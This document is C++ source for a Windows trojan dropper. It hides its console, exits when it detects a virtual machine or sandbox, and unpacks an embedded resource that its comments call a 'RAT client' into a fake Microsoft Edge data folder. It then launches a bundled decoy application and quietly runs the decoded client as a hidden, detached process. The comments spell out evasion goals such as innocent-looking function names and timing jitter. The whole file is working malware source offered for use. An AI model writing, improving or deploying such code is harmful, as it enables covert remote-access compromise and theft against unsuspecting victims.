#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <shlobj.h>
#include <time.h>
#include <wininet.h>
#include <algorithm>

// Use more innocent-looking function names
std::string generateUniqueIdentifier(int length)
{
    // Use a more complex seed for randomization
    SYSTEMTIME st;
    GetSystemTime(&st);
    srand((st.wMilliseconds * st.wSecond) ^ (GetTickCount() * GetCurrentProcessId()));

    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.resize(length);

    for (int i = 0; i < length; i++)
    {
        // Add some additional entropy
        Sleep(1);
        result[i] = charset[rand() % (sizeof(charset) - 1)];
    }

    return result;
}

// Simple XOR encryption/decryption
std::vector<unsigned char> transformData(const std::vector<unsigned char> &data, const std::string &key)
{
    std::vector<unsigned char> result = data;
    for (size_t i = 0; i < result.size(); i++)
    {
        result[i] = result[i] ^ key[i % key.size()];
    }
    return result;
}

bool saveDataToFile(const std::string &filename, const std::vector<unsigned char> &data)
{
    // Add a delay to avoid pattern recognition
    Sleep(50 + (rand() % 100));

    std::ofstream file(filename, std::ios::binary);
    if (!file.is_open())
    {
        return false;
    }

    file.write(reinterpret_cast<const char *>(data.data()), data.size());
    file.close();
    return true;
}

void launchApplication(const std::string &appPath)
{
    // Add jitter to timing
    Sleep(100 + (rand() % 150));

    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;

    // Use different creation flags
    if (CreateProcessA(
            appPath.c_str(),
            NULL,
            NULL,
            NULL,
            FALSE,
            NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &si,
            &pi))
    {
        // Add delay before closing handles
        Sleep(50);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Check if we're running in a VM or sandbox
bool isRunningInSecureEnvironment()
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Check for small amount of RAM (common in VMs)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2LL * 1024 * 1024 * 1024) // Less than 2GB
        return true;

    // Check for common VM/sandbox artifacts
    HANDLE hDevice = CreateFileA("\\\\.\\VBoxMiniRdrDN",
                                 GENERIC_READ,
                                 FILE_SHARE_READ,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_ATTRIBUTE_NORMAL,
                                 NULL);
    if (hDevice != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hDevice);
        return true;
    }

    return false;
}

// Add this function to properly handle executable paths
std::string getExecutablePath()
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// Add this function to check if a file has .exe extension
bool hasExeExtension(const std::string &path)
{
    std::string lowerPath = path;
    std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);
    return lowerPath.size() >= 4 &&
           lowerPath.substr(lowerPath.size() - 4) == ".exe";
}

int main(int argc, char *argv[])
{
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Get the current executable path
    std::string exePath = getExecutablePath();

    // Check if the current executable has .exe extension
    if (!hasExeExtension(exePath))
    {
        // Handle the error - create a copy with .exe extension if needed
        std::string newPath = exePath + ".exe";
        CopyFileA(exePath.c_str(), newPath.c_str(), FALSE);

        // Launch the new copy and exit
        STARTUPINFOA si = {sizeof(STARTUPINFOA)};
        PROCESS_INFORMATION pi;
        if (CreateProcessA(
                newPath.c_str(),
                NULL,
                NULL,
                NULL,
                FALSE,
                NORMAL_PRIORITY_CLASS,
                NULL,
                NULL,
                &si,
                &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        return 0;
    }

    // Evade sandbox detection
    if (isRunningInSecureEnvironment())
    {
        // Exit gracefully if in a VM/sandbox
        return 0;
    }

    // Add random delays to avoid timing-based detection
    Sleep(1000 + (rand() % 2000));

    // Use a more legitimate-looking path
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);

    // Make sure we use a valid directory structure
    std::string uniqueId = generateUniqueIdentifier(8);
    std::string basePath = std::string(appDataPath) + "\\Microsoft\\Edge\\User Data";
    std::string installDir = basePath + "\\" + uniqueId;

    // Create directory with multiple levels to avoid detection
    CreateDirectoryA(basePath.c_str(), NULL);
    CreateDirectoryA(installDir.c_str(), NULL);

    // Make sure we use .exe extension for the final executable
    std::string clientPath = installDir + "\\" + generateUniqueIdentifier(10) + ".dat";
    std::string originalAppPath = installDir + "\\app.exe"; // Changed to .exe

    // Generate a unique encryption key
    std::string encKey = generateUniqueIdentifier(16);

    // Extract and decrypt the embedded RAT client
    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
    if (hResInfo != NULL)
    {
        HGLOBAL hResData = LoadResource(NULL, hResInfo);
        if (hResData != NULL)
        {
            DWORD size = SizeofResource(NULL, hResInfo);
            void *pData = LockResource(hResData);
            if (pData != NULL)
            {
                std::vector<unsigned char> buffer(static_cast<unsigned char *>(pData),
                                                  static_cast<unsigned char *>(pData) + size);

                // Apply XOR transformation
                std::vector<unsigned char> transformedData = transformData(buffer, encKey);

                // Save with a different extension
                saveDataToFile(clientPath, transformedData);
            }
        }
    }

    // Extract the legitimate app
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(102), RT_RCDATA);
    if (hResInfo != NULL)
    {
        HGLOBAL hResData = LoadResource(NULL, hResInfo);
        if (hResData != NULL)
        {
            DWORD size = SizeofResource(NULL, hResInfo);
            void *pData = LockResource(hResData);
            if (pData != NULL)
            {
                std::vector<unsigned char> buffer(static_cast<unsigned char *>(pData),
                                                  static_cast<unsigned char *>(pData) + size);
                saveDataToFile(originalAppPath, buffer);
            }
        }
    }

    // Launch the legitimate application first
    launchApplication(originalAppPath);

    // Add a delay before launching the client
    Sleep(3000 + (rand() % 5000));

    // Launch the RAT client with different flags
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // First decrypt the file
    std::ifstream inFile(clientPath, std::ios::binary);
    std::vector<unsigned char> encData((std::istreambuf_iterator<char>(inFile)),
                                       std::istreambuf_iterator<char>());
    inFile.close();

    std::vector<unsigned char> decData = transformData(encData, encKey);
    std::string execPath = installDir + "\\" + generateUniqueIdentifier(8) + ".exe";
    saveDataToFile(execPath, decData);

    // Delete the encrypted file
    DeleteFileA(clientPath.c_str());

    if (CreateProcessA(
            execPath.c_str(),
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            NULL,
            NULL,
            &si,
            &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
